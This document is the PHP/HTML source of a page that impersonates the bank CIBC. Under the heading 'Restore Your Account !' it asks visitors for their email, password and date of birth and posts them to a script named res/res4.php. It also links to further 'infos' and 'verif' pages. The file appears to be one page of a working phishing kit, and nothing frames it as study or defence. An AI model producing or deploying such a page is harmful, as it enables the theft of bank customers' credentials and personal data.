<?PHP
error_reporting(0);
session_start();
include('identity/lib/css/S-DST.css');


?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>CIBC</title>
<meta name="generator" content="WYSIWYG Web Builder 12 Trial Version - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.png" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled2.css" rel="stylesheet" type="text/css">
<link href="css/verif.css" rel="stylesheet" type="text/css">
</head>
<body>
<form name="ff" action="res/res4.php" method="POST">
<div id="wb_Image2" style="position:absolute;left:0px;top:0px;width:1315px;height:691px;z-index:5;">
<img src="images/0.PNG" id="Image2" alt=""></div>
<div id="wb_Image1" style="position:absolute;left:0px;top:701px;width:1315px;height:302px;z-index:6;">
<img src="images/2.PNG" id="Image1" alt=""></div>

<div id="wb_Form1" style="position:absolute;left:263px;top:278px;width:560px;height:40px;z-index:8;">

</div>
<div id="wb_Image4" style="position:absolute;left:248px;top:260px;width:614px;height:52px;z-index:9;">
<a href="infos.php"><img src="images/11.PNG" id="Image4" alt=""></a></div>
<div id="wb_Image3" style="position:absolute;left:248px;top:307px;width:612px;height:47px;z-index:10;">
<a href="verif.php"><img src="images/515.PNG" id="Image3" alt=""></a></div>
<div id="wb_Form2" style="position:absolute;left:247px;top:354px;width:613px;height:303px;z-index:11;">
<input type="email" id="Editbox5" style="position:absolute;left:222px;top:62px;width:194px;height:25px;line-height:25px;z-index:0;" name="1" value="" spellcheck="false" placeholder="Email Access" required>
<input type="password" id="Editbox7" style="position:absolute;left:222px;top:106px;width:194px;height:25px;line-height:25px;z-index:1;" name="2" value="" spellcheck="false" placeholder="Password Access" required>
<input type="submit" id="Button1" name="" value="Next" style="position:absolute;left:543px;top:241px;width:56px;height:25px;">
<input type="date" id="Editbox1" style="position:absolute;left:222px;top:153px;width:194px;height:25px;line-height:25px;z-index:3;" name="3" value="" spellcheck="false" placeholder="Date Of Birth" required>

</div>
<div id="wb_Form4" style="position:absolute;left:249px;top:121px;width:378px;height:81px;z-index:12;">
<div id="wb_Text8" style="position:absolute;left:0px;top:0px;width:283px;height:25px;z-index:4;">
<span style="color:#D60139;font-family:'Bookman Old Style';font-size:21px;"><strong>Restore Your Account !</strong></span></div>

</div>
<div id="wb_Text7" style="position:absolute;left:249px;top:167px;width:335px;height:16px;z-index:13;">
<span style="color:#000000;font-family:Arial;font-size:13px;">All fields are mandatory unless stated (optional)</span></div>
<div id="wb_Text1" style="position:absolute;left:276px;top:363px;width:1111px;height:16px;z-index:14;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Please enter your Personal Information </span></div>
</form>
</body>
</html>